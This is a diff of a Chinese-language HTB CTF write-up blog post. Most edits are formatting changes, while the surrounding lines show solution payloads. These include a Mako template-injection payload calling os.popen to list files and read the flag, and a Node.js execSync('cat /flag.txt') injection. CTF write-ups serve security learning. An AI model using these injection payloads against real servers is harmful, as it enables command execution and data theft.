@@ -5,7 +5,7 @@ date: "2025-08-30"
 tags:
   - "HTB"
   - "CTF"
-  - "WEB"
+  - "Web"
   - "Coding"
   - "MOBILE"
   - "CRYPTO"
@@ -15,8 +15,6 @@ authors:
 draft: false              # 设为 true 则为草稿
 slug: "htb-challenge"          # 随机URL字符串
 ---
-<meta name="referrer" content="no-referrer">
-
 
 # HTB-CTF-记录
 
@@ -80,19 +78,18 @@ def spookify(text):
 
 直接渲染了，并且是Mako引擎
 
-```
+```python
 ${7*7}
 ```
 
 ![image-20250831121956207](https://raw.githubusercontent.com/bx33661/Picgo/main/20250831121958413.png)
 
-```
+```python
 ${__import__('os').popen('ls').read()}
 ${__import__('os').popen('cat /fla*').read()}
 ```
 
 得到flag
-
 
 ### **Trapped Source  被困的源头**
 
@@ -114,18 +111,12 @@ ${__import__('os').popen('cat /fla*').read()}
 
 输入获得 flag
 
-
-
-
-
 ### **Breathtaking View  令人惊叹的景色**
 
 > Check out my new website showcasing a breathtaking view—let's hope no one can 'manipulate' it!  
 > 查看我的新网站，展示令人惊叹的景色——希望没有人能“操控”它！
 
 一道 SSJI 的题目
-
-
 
 一个计算器界面
 
@@ -201,12 +192,9 @@ require('child_process').execSync('cat /flag.txt').toString()
 
 得到 flag
 
-
-
-
 ## Coding
 
-### Primed for Action 
+### Primed for Action
 
 > Intelligence units have intercepted a list of numbers. They seem to be used in a peculiar way: the adversary seems to be sending a list of numbers, most of which are garbage, but two of which are prime. These 2 prime numbers appear to form a key, which is obtained by multiplying the two. Your answer is the product of the two prime numbers. Find the key and help us solve the case.
 > 情报单位截获了一份数字列表。它们似乎以一种特殊的方式使用：对手似乎在发送一份数字列表，其中大部分是垃圾数据，但有两项是质数。这两个质数似乎组成了一把密钥，通过将这两个数相乘获得。你的答案是这两个质数的乘积。找到密钥并帮助我们破解案件。
